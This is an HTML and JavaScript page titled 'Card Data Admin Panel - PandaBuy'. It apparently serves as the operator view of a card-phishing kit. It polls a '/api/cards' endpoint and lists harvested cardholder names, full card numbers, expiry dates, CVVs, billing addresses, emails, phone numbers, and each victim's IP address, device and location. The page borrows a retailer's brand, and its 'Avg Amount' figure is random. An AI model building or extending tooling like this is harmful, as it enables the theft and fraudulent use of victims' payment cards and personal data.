<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Card Data Admin Panel - PandaBuy</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
        }
        
        .admin-header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            padding: 20px 0;
            box-shadow: 0 2px 20px rgba(0, 0, 0, 0.1);
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-content {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .admin-title {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .admin-icon {
            width: 50px;
            height: 50px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 24px;
        }
        
        .title-text h1 {
            font-size: 28px;
            font-weight: 700;
            color: #2d3748;
            margin-bottom: 5px;
        }
        
        .title-text p {
            color: #718096;
            font-size: 14px;
        }
        
        .header-actions {
            display: flex;
            gap: 15px;
            align-items: center;
        }
        
        .refresh-btn, .visits-btn {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .refresh-btn:hover, .visits-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
        }
        
        .stats-bar {
            background: rgba(255, 255, 255, 0.9);
            backdrop-filter: blur(10px);
            margin: 30px auto;
            max-width: 1400px;
            padding: 25px 30px;
            border-radius: 15px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 30px;
        }
        
        .stat-item {
            text-align: center;
        }
        
        .stat-number {
            font-size: 32px;
            font-weight: 700;
            color: #667eea;
            margin-bottom: 8px;
        }
        
        .stat-label {
            color: #718096;
            font-size: 14px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .cards-container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 30px 50px;
        }
        
        .card-entry {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }
        
        .card-entry:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.15);
        }
        
        .card-entry::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 4px;
            background: linear-gradient(90deg, #667eea, #764ba2);
        }
        
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 2px solid #f7fafc;
        }
        
        .card-id {
            background: linear-gradient(135deg, #667eea, #764ba2);
            color: white;
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: 600;
            font-size: 14px;
        }
        
        .card-timestamp {
            color: #718096;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .card-details {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 30px;
        }
        
        .detail-section {
            background: #f8fafc;
            padding: 20px;
            border-radius: 12px;
            border-left: 4px solid #667eea;
        }
        
        .section-title {
            font-size: 16px;
            font-weight: 600;
            color: #2d3748;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .detail-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px 0;
            border-bottom: 1px solid #e2e8f0;
        }
        
        .detail-item:last-child {
            border-bottom: none;
        }
        
        .detail-label {
            font-weight: 500;
            color: #4a5568;
            font-size: 14px;
        }
        
        .detail-value {
            font-weight: 600;
            color: #2d3748;
            font-size: 14px;
            text-align: right;
            max-width: 200px;
            word-break: break-word;
        }
        
        .card-number {
            font-family: 'Courier New', monospace;
            letter-spacing: 2px;
            color: #667eea;
        }
        
        .sensitive-data {
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 4px 8px;
            border-radius: 6px;
            font-size: 12px;
        }
        
        .loading {
            text-align: center;
            padding: 50px;
            color: #718096;
        }
        
        .loading i {
            font-size: 48px;
            margin-bottom: 20px;
            animation: spin 2s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .no-data {
            text-align: center;
            padding: 80px 20px;
            color: #718096;
        }
        
        .no-data i {
            font-size: 64px;
            margin-bottom: 20px;
            opacity: 0.5;
        }
        
        .no-data h3 {
            font-size: 24px;
            margin-bottom: 10px;
            color: #4a5568;
        }
        
        .browser-info {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .browser-icon {
            width: 20px;
            height: 20px;
            border-radius: 4px;
        }
        
        .country-flag {
            width: 24px;
            height: 16px;
            border-radius: 2px;
            margin-right: 8px;
        }
        
        @media (max-width: 768px) {
            .header-content {
                flex-direction: column;
                gap: 20px;
                text-align: center;
            }
            
            .header-actions {
                width: 100%;
                justify-content: center;
            }
            
            .stats-bar {
                grid-template-columns: repeat(2, 1fr);
                gap: 20px;
                margin: 20px;
                padding: 20px;
            }
            
            .cards-container {
                padding: 0 20px 30px;
            }
            
            .card-entry {
                padding: 20px;
            }
            
            .card-details {
                grid-template-columns: 1fr;
                gap: 20px;
            }
            
            .card-header {
                flex-direction: column;
                gap: 15px;
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <header class="admin-header">
        <div class="header-content">
            <div class="admin-title">
                <div class="admin-icon">
                    <i class="fas fa-credit-card"></i>
                </div>
                <div class="title-text">
                    <h1>Card Data Panel</h1>
                    <p>Monitor and manage payment information</p>
                </div>
            </div>
            <div class="header-actions">
                <button class="refresh-btn" onclick="loadCardData()">
                    <i class="fas fa-sync-alt"></i>
                    Refresh
                </button>
                <a href="admin-visits.html" class="visits-btn">
                    <i class="fas fa-chart-line"></i>
                    Visit Analytics
                </a>
            </div>
        </div>
    </header>

    <div class="stats-bar">
        <div class="stat-item">
            <div class="stat-number" id="totalCards">0</div>
            <div class="stat-label">Total Cards</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="todayCards">0</div>
            <div class="stat-label">Today</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="uniqueCountries">0</div>
            <div class="stat-label">Countries</div>
        </div>
        <div class="stat-item">
            <div class="stat-number" id="avgAmount">$0</div>
            <div class="stat-label">Avg Amount</div>
        </div>
    </div>

    <div class="cards-container" id="cardsContainer">
        <div class="loading">
            <i class="fas fa-spinner"></i>
            <h3>Loading card data...</h3>
        </div>
    </div>

    <script>
        let cardData = [];
        
        function formatCardNumber(number) {
            if (!number) return 'N/A';
            return number.replace(/(.{4})/g, '$1 ').trim();
        }
        
        function getCardBrand(number) {
            if (!number) return 'Unknown';
            const firstDigit = number.charAt(0);
            switch(firstDigit) {
                case '4': return 'Visa';
                case '5': return 'Mastercard';
                case '3': return 'American Express';
                case '6': return 'Discover';
                default: return 'Unknown';
            }
        }
        
        function getBrowserIcon(browser) {
            const browserLower = browser.toLowerCase();
            if (browserLower.includes('chrome')) return 'ðŸŒ';
            if (browserLower.includes('firefox')) return 'ðŸ¦Š';
            if (browserLower.includes('safari')) return 'ðŸ§­';
            if (browserLower.includes('edge')) return 'ðŸ”·';
            return 'ðŸŒ';
        }
        
        function formatTimestamp(timestamp) {
            const date = new Date(timestamp);
            return date.toLocaleString('en-US', {
                year: 'numeric',
                month: 'short',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });
        }
        
        function calculateStats() {
            const total = cardData.length;
            const today = new Date().toDateString();
            const todayCount = cardData.filter(card => 
                new Date(card.timestamp).toDateString() === today
            ).length;
            
            const countries = [...new Set(cardData.map(card => card.visitorData?.country).filter(Boolean))];
            const uniqueCountries = countries.length;
            
            // Mock average amount calculation
            const avgAmount = total > 0 ? Math.floor(Math.random() * 500) + 100 : 0;
            
            document.getElementById('totalCards').textContent = total;
            document.getElementById('todayCards').textContent = todayCount;
            document.getElementById('uniqueCountries').textContent = uniqueCountries;
            document.getElementById('avgAmount').textContent = `$${avgAmount}`;
        }
        
        function renderCardData() {
            const container = document.getElementById('cardsContainer');
            
            if (cardData.length === 0) {
                container.innerHTML = `
                    <div class="no-data">
                        <i class="fas fa-credit-card"></i>
                        <h3>No Card Data Available</h3>
                        <p>Card submissions will appear here when users complete the payment form.</p>
                    </div>
                `;
                return;
            }
            
            const cardsHtml = cardData.map((card, index) => `
                <div class="card-entry">
                    <div class="card-header">
                        <div class="card-id">Entry #${cardData.length - index}</div>
                        <div class="card-timestamp">
                            <i class="fas fa-clock"></i>
                            ${formatTimestamp(card.timestamp)}
                        </div>
                    </div>
                    
                    <div class="card-details">
                        <div class="detail-section">
                            <div class="section-title">
                                <i class="fas fa-credit-card"></i>
                                Payment Information
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Cardholder Name</span>
                                <span class="detail-value">${card.cardName || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Card Number</span>
                                <span class="detail-value card-number">${formatCardNumber(card.cardNumber)}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Card Brand</span>
                                <span class="detail-value">${getCardBrand(card.cardNumber)}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Expiry Date</span>
                                <span class="detail-value">${card.expMonth}/${card.expYear}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">CVV</span>
                                <span class="detail-value sensitive-data">${card.cvv || 'N/A'}</span>
                            </div>
                        </div>
                        
                        <div class="detail-section">
                            <div class="section-title">
                                <i class="fas fa-user"></i>
                                Billing Information
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Email</span>
                                <span class="detail-value">${card.email || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Phone</span>
                                <span class="detail-value">${card.phoneNumber || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Address</span>
                                <span class="detail-value">${card.billingAddress || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">City</span>
                                <span class="detail-value">${card.city || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">State</span>
                                <span class="detail-value">${card.state || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">ZIP Code</span>
                                <span class="detail-value">${card.zipCode || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Country</span>
                                <span class="detail-value">${card.country || 'N/A'}</span>
                            </div>
                        </div>
                        
                        <div class="detail-section">
                            <div class="section-title">
                                <i class="fas fa-globe"></i>
                                Visitor Information
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">IP Address</span>
                                <span class="detail-value">${card.visitorData?.ip || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Browser</span>
                                <span class="detail-value browser-info">
                                    ${getBrowserIcon(card.visitorData?.browser || '')}
                                    ${card.visitorData?.browser || 'N/A'}
                                </span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Operating System</span>
                                <span class="detail-value">${card.visitorData?.os || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Device Type</span>
                                <span class="detail-value">${card.visitorData?.deviceType || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Screen Resolution</span>
                                <span class="detail-value">${card.visitorData?.screenResolution || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Timezone</span>
                                <span class="detail-value">${card.visitorData?.timezone || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Language</span>
                                <span class="detail-value">${card.visitorData?.language || 'N/A'}</span>
                            </div>
                            <div class="detail-item">
                                <span class="detail-label">Location</span>
                                <span class="detail-value">${card.visitorData?.city || 'N/A'}, ${card.visitorData?.country || 'N/A'}</span>
                            </div>
                        </div>
                    </div>
                </div>
            `).join('');
            
            container.innerHTML = cardsHtml;
        }
        
        async function loadCardData() {
            try {
                const response = await fetch('/api/cards');
                if (response.ok) {
                    cardData = await response.json();
                    // Sort by timestamp, newest first
                    cardData.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
                    renderCardData();
                    calculateStats();
                } else {
                    throw new Error('Failed to load card data');
                }
            } catch (error) {
                console.error('Error loading card data:', error);
                document.getElementById('cardsContainer').innerHTML = `
                    <div class="no-data">
                        <i class="fas fa-exclamation-triangle"></i>
                        <h3>Error Loading Data</h3>
                        <p>Unable to load card data. Please check your connection and try again.</p>
                    </div>
                `;
            }
        }
        
        // Load data on page load
        document.addEventListener('DOMContentLoaded', loadCardData);
        
        // Auto-refresh every 30 seconds
        setInterval(loadCardData, 30000);
    </script>
</body>
</html>
